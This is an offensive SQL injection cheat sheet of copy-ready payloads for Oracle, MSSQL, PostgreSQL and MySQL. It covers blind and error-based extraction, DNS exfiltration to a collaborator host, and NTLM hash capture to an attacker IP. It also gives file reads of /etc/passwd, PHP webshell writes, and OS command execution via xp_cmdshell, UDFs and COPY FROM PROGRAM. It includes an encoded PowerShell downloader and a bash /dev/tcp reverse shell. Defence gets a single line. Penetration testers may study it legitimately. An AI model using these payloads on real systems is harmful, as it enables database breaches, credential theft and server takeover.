# SQL Injection Cheat Sheet

---

## General / Universal

> These work regardless of the database backend or require no DB-specific knowledge.

### Boolean-Based

```sql
' OR 1=1 --
' AND 1=1 --
' AND 1=2 --
```

### Comment Syntax (Universal)

```sql
-- comment       (standard SQL, works in Oracle, MSSQL, PostgreSQL)
/* comment */    (block comment, works in MSSQL, PostgreSQL, MySQL)
```

### Defending Against SQL Injection

Use `parameterized queries`!

### Headers That May Be Susceptible to SQLi

```
HOST: 127.0.0.1'
X-Forwarded-For: 127.0.0.1'
User-Agent: Mozilla/5.0'
Referer: http://example.com'
Cookie: session=abc123'
```

### Regex Patterns for Finding SQLi Vulnerabilities

```regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP (WHERE|VALUES).*?' (WHERE|VALUES).*" + .*sql.*" jdbcTemplate
```

### Common Character Bypasses

- Use `/**/` instead of space.
- Use `$$string$$` instead of `'string'`.

---

---

---

## Oracle

### String Concatenation

```sql
'foo'||'bar'
```

### Substring

```sql
SUBSTR('foobar', 4, 2)
```

### Comments

```sql
--comment
```

### Database Version

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

### Database Contents

**List tables:**

```sql
SELECT * FROM all_tables
```

**List columns:**

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Boolean-Based

```sql
' AND 1=1--
' AND 1=2--
-- Oracle requires a table in FROM, so use dual:
' AND (SELECT 'a' FROM dual WHERE 1=1)='a'--
' AND (SELECT 'a' FROM dual WHERE 1=2)='a'--
-- Character-based blind:
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--
```

### Conditional Errors

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

### Error-Based Data Extraction

```sql
-- Force a type conversion error that leaks data in the error message:
SELECT UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual
-- Also works via XMLType casting (triggers ORA- error with data in message):
SELECT XMLTYPE((SELECT '<?xml version="1.0"?><x>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</x>' FROM dual)) FROM dual
```

### Time Delays

```sql
dbms_pipe.receive_message(('a'),10)
```

### Conditional Time Delays

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```

### DNS Lookup

**Unpatched:**

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Patched (elevated privs):**

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

### DNS Lookup with Data Exfiltration

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

### Reading Files

**With UTL_FILE (requires CREATE DIRECTORY privilege or DBA):**

```sql
-- Step 1: A directory object must exist pointing to the OS path.
-- (Usually pre-created by DBA; check existing ones:)
SELECT directory_name, directory_path FROM all_directories;

-- Step 2: Read file line by line via anonymous PL/SQL block.
-- Inject this via a stacked context (stored proc SQLi, DBMS_SCHEDULER, etc.)
DECLARE
  v_file  UTL_FILE.FILE_TYPE;
  v_line  VARCHAR2(32767);
  v_out   CLOB := '';
BEGIN
  v_file := UTL_FILE.FOPEN('DIRECTORY_OBJECT_NAME', 'filename.txt', 'R');
  LOOP
    UTL_FILE.GET_LINE(v_file, v_line);
    v_out := v_out || v_line || CHR(10);
  END LOOP;
EXCEPTION
  WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(v_file);
  -- Exfiltrate v_out via DNS OOB or error
END;
```

**With Java stored procedure (requires JAVA privilege):**

```sql
-- Grant Java perms first (needs DBA):
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','read');

-- Create the Java reader:
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "ReadFile" AS
import java.io.*;
public class ReadFile {
  public static String read(String path) throws Exception {
    BufferedReader br = new BufferedReader(new FileReader(path));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) sb.append(line).append("\n");
    br.close();
    return sb.toString();
  }
};
/

-- Wrap it:
CREATE OR REPLACE FUNCTION read_file(p VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'ReadFile.read(java.lang.String) return java.lang.String';
/

-- Use it:
SELECT read_file('/etc/passwd') FROM dual;
```

### Writing Files

**With UTL_FILE:**

```sql
DECLARE
  v_file UTL_FILE.FILE_TYPE;
BEGIN
  v_file := UTL_FILE.FOPEN('DIRECTORY_OBJECT_NAME', 'output.txt', 'W');
  UTL_FILE.PUT_LINE(v_file, 'data to write');
  UTL_FILE.FCLOSE(v_file);
END;
```

**With Java stored procedure:**

```sql
-- Grant write permission first:
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','write');

CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "WriteFile" AS
import java.io.*;
public class WriteFile {
  public static void write(String path, String content) throws Exception {
    FileWriter fw = new FileWriter(path);
    fw.write(content);
    fw.close();
  }
};
/

CREATE OR REPLACE PROCEDURE write_file(p VARCHAR2, c VARCHAR2)
AS LANGUAGE JAVA NAME 'WriteFile.write(java.lang.String, java.lang.String)';
/

EXEC write_file('/tmp/proof.txt', 'pwned');
```

### RCE

**Via Java Stored Procedure (requires JAVA privilege):**

```sql
-- Grant execute permission:
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','');
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');

-- Create the Java executor:
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OsCmd" AS
import java.io.*;
public class OsCmd {
  public static String exec(String cmd) throws Exception {
    String[] shell = {"/bin/bash", "-c", cmd};
    Process p = Runtime.getRuntime().exec(shell);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) sb.append(line).append("\n");
    return sb.toString();
  }
};
/

-- Wrap it:
CREATE OR REPLACE FUNCTION os_cmd(p_cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'OsCmd.exec(java.lang.String) return java.lang.String';
/

-- Execute:
SELECT os_cmd('id') FROM dual;
SELECT os_cmd('whoami') FROM dual;
```

**Via DBMS_SCHEDULER (requires CREATE EXTERNAL JOB privilege):**

```sql
-- Blind execution only (no output returned):
EXEC DBMS_SCHEDULER.create_program(
  'PWNJOB', 'EXECUTABLE',
  '/bin/bash -c "id > /tmp/out.txt"', 0, TRUE);

EXEC DBMS_SCHEDULER.create_job(
  job_name        => 'PWNJOB_RUN',
  program_name    => 'PWNJOB',
  start_date      => NULL,
  repeat_interval => NULL,
  end_date        => NULL,
  enabled         => TRUE,
  auto_drop       => TRUE);
```

### NetNTLM Hash Capture (Windows Oracle only)

```sql
-- UTL_HTTP to attacker SMB share triggers NTLM auth:
SELECT UTL_HTTP.request('http://<ATTACKER_IP>/') FROM dual;

-- Or via EXTPROC / UNC reference (environment-dependent):
SELECT UTL_INADDR.get_host_address('<ATTACKER_IP>') FROM dual;

-- Capture with Responder:
-- sudo python3 Responder.py -I eth0
-- hashcat -m 5600 hash.txt rockyou.txt
```

> Oracle does **not** support stacked queries in standard SQL context (driver blocks multi-statement). Stacking is only possible inside PL/SQL stored procedures or via DBMS_SCHEDULER.

---

---

---

## Microsoft SQL Server (MSSQL)

### String Concatenation

```sql
'foo'+'bar'
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
--comment
/*comment*/
```

### Database Version

```sql
SELECT @@version
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables   -- TABLE_NAME column
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

### Error-Based Data Extraction

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- Error: Conversion failed when converting the varchar value 'secret' to data type int.
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
```

### Boolean-Based

```sql
' AND 1=1;--
```

### Time-Based

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10';--
```

### Time Delays

```sql
WAITFOR DELAY '0:0:10'
```

### Conditional Time Delays

```sql
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

### DNS Lookup

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

### DNS Lookup with Data Exfiltration

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

### DNS OOB (Extended)

|SQL Function|SQL Query|
|---|---|
|`master..xp_dirtree`|`DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_fileexist`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_subdirs`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`sys.dm_os_file_exists`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`|
|`fn_trace_gettable`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`|
|`fn_get_audit_file`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|
|`split result into sub-domains`|`DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|

### RCE (xp_cmdshell)

```sql
-- Check if we are sysadmin
IS_SRVROLEMEMBER('sysadmin');

-- Enable 'Advanced Options'
EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;

-- Enable 'xp_cmdshell'
EXEC sp_configure 'xp_cmdshell', '1';RECONFIGURE;

-- Ping ourselves
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';

--Reverse Shell create server at 4443 and listener at 4444
sudo python3 -m http.server 4443

sudo nc -lvnp 4444

--this is base64 to give you shell
EXEC xp_cmdshell 'powershell+-exec+bypass+-enc+KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA3AC4AMQA0ADIAOgA0ADQANAAzAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANwAuADEANAAyACAANAA0ADQANAAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA';
```

### RCE via OLE Automation (alternative to xp_cmdshell)

```sql
-- Enable OLE Automation Procedures:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Execute a command via WScript.Shell:
DECLARE @execmd INT;
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
EXEC SP_OAMETHOD @execmd, 'run', null, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';
EXEC SP_OADESTROY @execmd;
```

### NetNTLM Hash Capture

```bash
sudo python3 Responder.py -I eth0
```

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```

```bash
hashcat -m 5600 'file containing the hash.txt' ~/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### File Read

```sql
-- Check permissions
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE')
WHERE permission_name = 'ADMINISTER BULK OPERATIONS'
OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

-- Get file length
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x;

-- Get file contents
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x;
```

### File Write

```sql
-- Method 1: xp_cmdshell echo redirect (requires xp_cmdshell enabled):
EXEC xp_cmdshell 'echo your content here > C:\inetpub\wwwroot\shell.php';
-- Append instead of overwrite:
EXEC xp_cmdshell 'echo more content >> C:\inetpub\wwwroot\shell.php';

-- Method 2: OLE Automation via Scripting.FileSystemObject (requires OLE enabled):
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @OLE INT, @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUTPUT;
-- 2 = ForWriting, 1 = create if not exist
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUTPUT, 'C:\inetpub\wwwroot\shell.php', 2, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', NULL, '<?php system($_GET[''cmd'']); ?>';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
```

---

---

---

## PostgreSQL

### String Concatenation

```sql
'foo'||'bar'
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
--comment
/*comment*/
```

### Database Version

```sql
SELECT version()
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Boolean-Based

```sql
' AND 1=1--
' AND 1=2--
-- Use CASE for blind extraction:
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)='a'--
-- Character extraction:
' AND SUBSTR((SELECT current_database()),1,1)='p'--
```

### Conditional Errors

```sql
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
```

### Error-Based Data Extraction

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-- Error: invalid input syntax for integer: "secret"
```

### Error-Based SQL Injection (Extended)

```sql
' and 0=CAST((SELECT VERSION()) AS INT)--
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
```

### Time Delays

```sql
|| SELECT pg_sleep(10)
```

### Conditional Time Delays

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

### DNS Lookup

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### DNS Lookup with Data Exfiltration

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
  SELECT into p (SELECT YOUR-QUERY-HERE);
  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
  execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

### NetNTLM Hash Capture (Windows PostgreSQL only)

```sql
-- COPY TO PROGRAM via UNC path triggers NTLM auth on Windows:
COPY (SELECT '') TO PROGRAM 'net use \\<ATTACKER_IP>\share';

-- Or via lo_import with a UNC path:
SELECT lo_import('\\\\<ATTACKER_IP>\\share\\test');

-- Capture with Responder:
-- sudo python3 Responder.py -I eth0
-- hashcat -m 5600 hash.txt rockyou.txt
```

> Note: UNC path hash capture for PostgreSQL only works on Windows-hosted instances.

### Reading Files

**With COPY:**

```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**With Large Objects:**

```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
```

```bash
echo 726f6f743<SNIP> | xxd -r -p
```

### Writing Files

**With COPY:**

```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

**With Large Objects:**

```bash
split -b 2048 /etc/passwd xaa
xxd -ps -c 99999999999 xaa
```

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
SELECT lo_put(31337, 0, 'this is a test'); --in case INSERT IS FORBIDDEN
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
```

### Command Execution

**RCE with COPY:**

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**RCE with Extensions:**

```bash
sudo apt install postgresql-server-dev-13 gcc
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
nc -nvlp 443
```

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);
```

---

## MySQL

### String Concatenation

```sql
'foo' 'bar'
CONCAT('foo','bar')
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
#comment
-- comment    (note the trailing space)
/*comment*/
```

### Database Version

```sql
SELECT @@version
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables   -- name column
SELECT table_name FROM information_schema.tables
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

### Error-Based Data Extraction

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
-- Error: XPATH syntax error: '\secret'
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
-- Limited support — depends on PHP/Python API
```

### Time Delays

```sql
SELECT SLEEP(10)
```

### Conditional Time Delays

```sql
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

### DNS Lookup (Windows Only)

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

### DNS Lookup with Data Exfiltration (Windows Only)

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### NetNTLM Hash Capture (Windows MySQL only)

```sql
-- Any UNC path access triggers NTLM auth on Windows:
SELECT LOAD_FILE('\\\\<ATTACKER_IP>\\share\\test');
SELECT '' INTO OUTFILE '\\\\<ATTACKER_IP>\\share\\out';
SELECT '' INTO DUMPFILE '\\\\<ATTACKER_IP>\\share\\out';
LOAD DATA INFILE '\\\\<ATTACKER_IP>\\share\\test' INTO TABLE db.tmp;

-- Capture with Responder:
-- sudo python3 Responder.py -I eth0
-- hashcat -m 5600 hash.txt rockyou.txt
```

### Reading Files

```sql
-- Check FILE privilege first:
SELECT File_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(user(), '@', 1);

-- Check secure_file_priv (empty = no restriction):
SELECT @@secure_file_priv;

-- Read file:
SELECT LOAD_FILE('/etc/passwd');

-- Via UNION:
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
```

### Writing Files

```sql
-- Check FILE privilege and secure_file_priv first (see above).

-- Write a webshell:
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- DUMPFILE writes raw bytes (no newlines added) — use for binary files:
SELECT unhex('<hex_of_binary>') INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';

-- Via UNION:
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL
INTO OUTFILE '/var/www/html/shell.php'--
```

### RCE via UDF (User-Defined Functions)

```sql
-- Pre-requisites: FILE privilege + write access to plugin dir.

-- Check plugin directory:
SELECT @@plugin_dir;

-- Write UDF library to plugin dir (using hex-encoded binary):
-- (Use sqlmap's lib_mysqludf_sys or compile your own)
SELECT unhex('<hex_of_lib_mysqludf_sys_64.so>') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Create the UDF:
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Execute OS commands:
SELECT sys_eval('id');
SELECT sys_eval('whoami');
SELECT sys_eval('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');

-- Cleanup:
DROP FUNCTION sys_eval;
```

### RCE via Webshell (if web root is writable)

```sql
-- Write PHP webshell:
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/images/shell.php';

-- Access it:
-- http://target/images/shell.php?cmd=id
```